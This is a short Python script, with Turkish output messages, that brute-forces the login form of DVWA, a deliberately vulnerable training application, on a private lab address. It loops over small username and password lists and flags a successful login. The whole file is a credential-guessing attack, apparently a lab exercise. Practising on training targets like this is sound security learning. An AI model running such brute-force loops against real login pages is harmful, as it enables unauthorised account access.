import requests

header = {"Cookie": "security=low; PHPSESSID=51a30aa58415471e2a18cca6aa509776"}
username_list = ["admin","password"]
password_list = ["admin","password"]
for i in username_list:
    for j in password_list:
        url = "http://10.0.2.5/dvwa/vulnerabilities/brute/?username="+str(i)+"&password="+str(j)+"&Login=Login"
        sonuc = requests.get(url=url, headers=header)
        print("Username: ",i)
        print("Password: ",j)
        print("Status code: ",sonuc.status_code)
        print("Uzunluk: ", len(sonuc.content))
        if not "Username and/or password incorrect" in str(sonuc.content):
            print("Kullanıcı adı ve parola doğru")
        print("----------------------------------------")